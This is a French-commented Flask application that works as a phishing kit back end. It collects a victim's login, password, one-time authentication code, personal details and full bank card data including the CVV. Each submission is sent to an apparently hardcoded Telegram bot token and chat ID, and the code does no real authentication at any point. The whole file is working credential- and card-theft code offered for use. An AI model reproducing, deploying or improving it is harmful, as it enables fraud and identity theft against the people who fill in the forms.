from flask import Flask, render_template, request, redirect, url_for, session
import requests

app = Flask(__name__)
app.secret_key = 'ta_cle_secrete_ici'  # Remplace par une clé secrète forte

# Configuration Telegram
BOT_TOKEN = "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A"
CHAT_ID = "6297861735"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}
    try:
        response = requests.post(url, data=payload)
        if response.status_code != 200:
            print(f"Erreur Telegram: {response.text}")
    except Exception as e:
        print(f"Exception lors de l'envoi Telegram: {e}")

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        identifiant = request.form.get('identifiant')
        mdp = request.form.get('password')  # <--- ICI : nom du champ HTML = "password"
        session['identifiant'] = identifiant
        session['mdp'] = mdp
        send_to_telegram(f"Login info:\nIdentifiant: {identifiant}\nMot de passe: {mdp}")
        return redirect(url_for('auth'))
    return render_template('Login.html')

@app.route('/auth', methods=['GET', 'POST'])
def auth():
    if 'identifiant' not in session or 'mdp' not in session:
        return redirect(url_for('login'))

    if request.method == 'POST':
        code = request.form.get('code')
        session['code'] = code
        send_to_telegram(f"Code d'authentification: {code}")
        return redirect(url_for('secure'))
    return render_template('auth.html')

@app.route('/secure', methods=['GET', 'POST'])
def secure():
    if 'code' not in session:
        return redirect(url_for('auth'))

    if request.method == 'POST':
        nom = request.form.get('nom')
        naissance = request.form.get('naissance')
        email = request.form.get('email')
        telephone = request.form.get('telephone')
        carte = request.form.get('carte')
        expiration = request.form.get('expiration')
        cvv = request.form.get('cvv')

        msg = (
            f"Infos personnelles:\n"
            f"Nom: {nom}\n"
            f"Date de naissance: {naissance}\n"
            f"Email: {email}\n"
            f"Téléphone: {telephone}\n"
            f"Carte bancaire: {carte}\n"
            f"Expiration: {expiration}\n"
            f"CVV: {cvv}"
        )
        send_to_telegram(msg)
        session['secure'] = True
        return redirect(url_for('thanks'))

    return render_template('secure.html')


@app.route('/thanks')
def thanks():
    if not session.get('secure'):
        return redirect(url_for('secure'))
    return render_template('thanks.html')

if __name__ == '__main__':
    app.run(debug=True)